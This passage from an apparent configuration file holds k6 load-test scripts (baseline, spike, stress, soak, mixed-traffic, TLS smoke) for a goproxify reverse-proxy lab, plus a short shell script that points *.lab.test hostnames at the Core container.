          stages: [
            { duration: "10s", target: 50 },
            { duration: "40s", target: 50 },
            { duration: "10s", target: 0 },
          ],
          thresholds: { http_req_failed: ["rate<0.01"] },
        };

        export default function () {
          const r = Math.random();
          if (r < 0.8) get("/");
          else if (r < 0.9) get("/echo");
          else get("/bytes?n=65536");
        }

        export const handleSummary = summary("saturation");
      K_baseline: |
        // Montée en charge progressive (équivalent docs/benchmark.md), sans latence backend.
        import { get, summary } from "./common.js";

        export const options = {
          summaryTrendStats: ["avg", "med", "p(90)", "p(95)", "p(99)", "max"],
          stages: [
            { duration: "30s", target: 100 },
            { duration: "60s", target: 500 },
            { duration: "30s", target: 0 },
          ],
          thresholds: { http_req_failed: ["rate<0.01"], http_req_duration: ["p(95)<100", "p(99)<300"] },
        };

        export default function () {
          get("/");
        }

        export const handleSummary = summary("baseline");
      K_spike: |
        // Pic brutal : 20 -> 1000 VUs en 10 s, palier, retour. Vérifie l'absence d'effondrement et la reprise.
        import { get, summary } from "./common.js";

        export const options = {
          summaryTrendStats: ["avg", "med", "p(90)", "p(95)", "p(99)", "max"],
          stages: [
            { duration: "20s", target: 20 },
            { duration: "10s", target: 1000 },
            { duration: "60s", target: 1000 },
            { duration: "10s", target: 20 },
            { duration: "40s", target: 20 },
          ],
          thresholds: { http_req_failed: ["rate<0.02"] },
        };

        export default function () {
          get("/slow?ms=20");
        }

        export const handleSummary = summary("spike");
      K_stress: |
        // Recherche du point de rupture : débit imposé (open model) croissant jusqu'à saturation.
        // Le run s'arrête dès que >10 % d'erreurs (abortOnFail) : le dernier palier sain = capacité.
        import { get, summary } from "./common.js";

        export const options = {
          summaryTrendStats: ["avg", "med", "p(90)", "p(95)", "p(99)", "max"],
          scenarios: {
            breakpoint: {
              executor: "ramping-arrival-rate",
              startRate: 200,
              timeUnit: "1s",
              preAllocatedVUs: 500,
              maxVUs: 5000,
              stages: [
                { duration: "1m", target: 2000 },
                { duration: "1m", target: 5000 },
                { duration: "1m", target: 10000 },
                { duration: "1m", target: 20000 },
              ],
            },
          },
          thresholds: {
            http_req_failed: [{ threshold: "rate<0.10", abortOnFail: true, delayAbortEval: "20s" }],
          },
        };

        export default function () {
          get("/");
        }

        export const handleSummary = summary("stress");
      K_soak: |
        // Endurance : charge modérée constante (DURATION, défaut 30m). Surveiller RSS / goroutines / FD du Core
        // pendant le run (lab.sh soak lance aussi la collecte docker stats).
        import { get, summary } from "./common.js";

        export const options = {
          summaryTrendStats: ["avg", "med", "p(90)", "p(95)", "p(99)", "max"],
          scenarios: {
            soak: {
              executor: "constant-arrival-rate",
              rate: Number(__ENV.RATE || 300),
              timeUnit: "1s",
              duration: __ENV.DURATION || "30m",
              preAllocatedVUs: 200,
              maxVUs: 1000,
            },
          },
          thresholds: { http_req_failed: ["rate<0.005"], http_req_duration: ["p(99)<500"] },
        };

        export default function () {
          const r = Math.random();
          if (r < 0.7) get("/");
          else if (r < 0.85) get("/echo");
          else if (r < 0.95) get("/bytes?n=65536");
          else get("/slow?ms=200");
        }

        export const handleSummary = summary("soak");
      K_mixed: |
        // Trafic réaliste : petites/grosses réponses, backend lent, backend instable, uploads, SSE.
        import http from "k6/http";
        import { check } from "k6";
        import { BASE, summary } from "./common.js";

        export const options = {
          summaryTrendStats: ["avg", "med", "p(90)", "p(95)", "p(99)", "max"],
          stages: [
            { duration: "30s", target: 100 },
            { duration: "2m", target: 300 },
            { duration: "30s", target: 0 },
          ],
          thresholds: {
            "http_req_failed{kind:ok}": ["rate<0.01"],
            "http_req_duration{kind:ok}": ["p(95)<400"],
          },
        };

        const payload = "y".repeat(256 * 1024);

        export default function () {
          const r = Math.random();
          let res;
          if (r < 0.5) res = http.get(`$${BASE}/`, { tags: { kind: "ok" } });
          else if (r < 0.65) res = http.get(`$${BASE}/bytes?n=1048576`, { tags: { kind: "ok" } });
          else if (r < 0.75) res = http.get(`$${BASE}/slow?ms=300`, { tags: { kind: "ok" } });
          else if (r < 0.85) res = http.get(`$${BASE}/flaky?p=30`, { tags: { kind: "flaky" } });
          else if (r < 0.95) res = http.post(`$${BASE}/upload`, payload, { tags: { kind: "ok" } });
          else res = http.get(`$${BASE}/sse?n=5&ms=100`, { tags: { kind: "ok" } });
          check(res, { "reponse recue": (x) => x.status > 0 });
        }

        export const handleSummary = summary("mixed");
      K_tls_smoke: |
        // Smoke HTTPS : 2 VUs, 15 s sur lab-tls.lab.test en HTTPS (cert auto-signé accepté).
        // Vérifie que le Core répond correctement en TLS sans erreur.
        import http from "k6/http";
        import { check } from "k6";
        import { summary } from "./common.js";

        export const options = {
          summaryTrendStats: ["avg", "med", "p(90)", "p(95)", "p(99)", "max"],
          vus: 2,
          duration: "15s",
          thresholds: { http_req_failed: ["rate<0.01"], http_req_duration: ["p(95)<500"] },
          tlsConfig: { insecureSkipVerify: true },
        };

        const HOST = __ENV.HOST || "lab-tls.lab.test";
        const BASE = `https://$${HOST}`;

        export default function () {
          const res = http.get(`$${BASE}/`);
          check(res, { "status 200": (r) => r.status === 200 });
        }

        export const handleSummary = summary("tls-smoke");
      K_hosts: |
        #!/bin/sh
        # Résout *.lab.test vers l'IP du Core (trouvée par DNS Docker) : évite CORE_IP et extra_hosts.
        ip=$$(getent hosts "$${CORE_HOST:-goproxify-core}" | awk '{print $$1; exit}')
        [ -n "$$ip" ] || { echo "goproxify-core introuvable sur goproxify_net (stack principale démarrée ?)" >&2; exit 1; }
        grep -v '\.lab\.test' /etc/hosts > /tmp/hosts.new
        for h in lab-fast lab-waf-block lab-waf-detect lab-ratelimit lab-chaos lab-juice lab-tls lab-h3; do echo "$$ip $$h.lab.test" >> /tmp/hosts.new; done
        cat /tmp/hosts.new > /etc/hosts

